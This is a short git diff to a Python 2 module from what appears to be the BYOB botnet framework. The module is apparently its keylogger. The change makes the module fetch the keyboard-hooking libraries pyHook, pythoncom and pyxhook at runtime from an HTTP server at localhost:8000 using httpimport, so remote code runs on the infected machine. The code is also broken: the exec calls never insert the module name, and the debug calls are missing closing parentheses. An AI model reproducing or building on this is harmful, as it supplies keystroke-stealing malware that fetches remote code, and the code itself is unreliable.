@@ -7,21 +7,36 @@ Copyright (c) 2018 Daniel Vega-Myhre
 from __future__ import print_function
 
 # standard library
+
 import os
 import sys
 import time
 import Queue
 import threading
 import cStringIO
+import httpimport
 import collections
-if os.name == 'nt':
-    import pyHook
-    import pythoncom
-else:
-    import pyxhook
 
 # byob
+
 import util
+
+# remote imports
+
+with httpimport.remote_repo(['pyHook','pythoncom','pyxhook'], base_url='http://localhost:8000'):
+    if os.name == 'nt':
+        for module in ['pyHook','pythoncom']:
+            try:
+                exec "import %s" in globals()
+            except ImportError:
+                util.debug("Error: unable to import '%s'" % module
+    else:
+        for module in ['pyxhook']:
+            try:
+                exec "import %s" in globals()
+            except ImportError:
+                util.debug("Error: unable to import '%s'" % module
+
 
 
 _debug  = True
